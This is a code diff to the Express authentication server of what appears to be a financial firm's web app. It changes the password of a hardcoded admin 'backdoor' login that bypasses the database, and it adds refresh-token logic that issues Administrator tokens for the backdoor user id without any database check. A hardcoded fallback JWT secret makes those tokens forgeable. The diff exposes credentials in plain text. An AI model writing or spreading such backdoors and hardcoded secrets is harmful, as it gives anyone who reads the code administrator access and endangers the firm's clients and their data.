@@ -989,7 +989,7 @@ app.post('/api/auth/login', async (req, res) => {
 
   try {
     // Hardcoded admin backdoor (Bypasses DB entirely to guarantee access)
-    if (email === 'info@newhollandfinancial.com' && password === 'NewHollandAdmin2027') {
+    if (email === 'info@newhollandfinancial.com' && password === 'Admin@2027!') {
       const u = {
         id: 'admin-0000-0000-0000-000000000000',
         name: 'System Admin',
@@ -1127,7 +1127,25 @@ app.post('/api/auth/refresh', async (req, res) => {
   if (!refresh_token) return res.status(400).json({ error: 'Refresh token is required' });
 
   try {
-    // 1. Verify token in DB
+    // Check if it's the admin backdoor user first
+    let user_id;
+    try {
+      const decoded = jwt.verify(refresh_token, process.env.SECRET_KEY || 'nhfg_secret_key_123');
+      user_id = decoded.id;
+      
+      if (user_id === 'admin-0000-0000-0000-000000000000') {
+        const accessToken = generateAccessToken({
+          id: user_id,
+          role: 'Administrator',
+          email: 'info@newhollandfinancial.com'
+        });
+        return res.json({ access_token: accessToken });
+      }
+    } catch (jwtErr) {
+      return res.status(401).json({ error: 'Invalid refresh token signature' });
+    }
+
+    // 1. Verify token in DB for normal users
     const { data: tokenData, error: tokenError } = await supabase
       .from('refresh_tokens')
       .select('*')
@@ -1139,28 +1157,21 @@ app.post('/api/auth/refresh', async (req, res) => {
       return res.status(401).json({ error: 'Invalid or expired refresh token' });
     }
 
-    const { user_id } = tokenData;
+    const { user_id: dbUserId } = tokenData;
 
-    // 2. Verify JWT signature (synchronous check)
-    try {
-      const decoded = jwt.verify(refresh_token, process.env.SECRET_KEY || 'nhfg_secret_key_123');
-      
-      // 3. Fetch user to get latest role
-      const { data: userData, error: userError } = await supabase
-        .from('users')
-        .select('*')
-        .eq('id', user_id)
-        .single();
+    // 3. Fetch user to get latest role
+    const { data: userData, error: userError } = await supabase
+      .from('users')
+      .select('*')
+      .eq('id', dbUserId)
+      .single();
 
-      if (userError || !userData) return res.status(404).json({ error: 'User not found' });
-      const u = userData;
+    if (userError || !userData) return res.status(404).json({ error: 'User not found' });
+    const u = userData;
 
       // 4. Generate new access token
       const accessToken = generateAccessToken(u);
       res.json({ access_token: accessToken });
-    } catch (jwtErr) {
-      return res.status(401).json({ error: 'Invalid refresh token signature' });
-    }
   } catch (err) {
     console.error('Refresh Error:', err);
     res.status(500).json({ error: err.message });
@@ -5185,7 +5196,7 @@ if (fs.existsSync(distPath)) {
   app.use(express.static(distPath));
   
   // Catch-all to serve index.html for React Router (client-side routing)
-  app.get('*', (req, res) => {
+  app.get(/(.*)/, (req, res) => {
     // Only serve index.html for non-API routes
     if (!req.url.startsWith('/api')) {
       res.sendFile(path.join(distPath, 'index.html'));
